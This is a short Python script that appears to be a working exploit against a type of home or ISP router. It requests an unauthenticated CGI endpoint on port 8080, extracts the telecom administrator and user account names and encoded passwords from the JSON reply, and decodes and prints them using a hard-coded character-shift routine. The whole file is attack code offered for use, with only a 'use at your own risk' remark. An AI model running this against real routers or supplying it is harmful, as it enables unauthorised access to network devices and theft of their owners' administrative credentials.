from urllib.request import urlopen
import json

def passwd_decode(code) -> str: 
    passwd_list = map(int, code.split('&'))
    result=[]
    for i in passwd_list:
        '''Use this at your own risk!'''
        if i <= 57 or i >= 110 and i < 120:
            pass
        if i >= 100 and i < 110 or i == 120:
            i -= 4
        if i > 57 and i < 100:
            i += 22

        result.append(chr(i))
        #print(i, chr(i))
    return (''.join(result))

IP = input("Please input IP address of the router: ")
URL = f"http://{IP}:8080/cgi-bin/baseinfoSet.cgi"

_ = urlopen(URL)
data = json.loads(_.read())
baseinfoSet = data["BASEINFOSET"]

admin = [baseinfoSet["baseinfoSet_TELECOMACCOUNT"],
         baseinfoSet["baseinfoSet_TELECOMPASSWORD"][:-1]]
user  = [baseinfoSet["baseinfoSet_USERACCOUNT"],
         baseinfoSet["baseinfoSet_USERPASSWORD"][:-1]]

print (f"Admin: {admin[0]} ; {passwd_decode(admin[1])}\nUser : {user[0]} ; {passwd_decode(user[1])}")
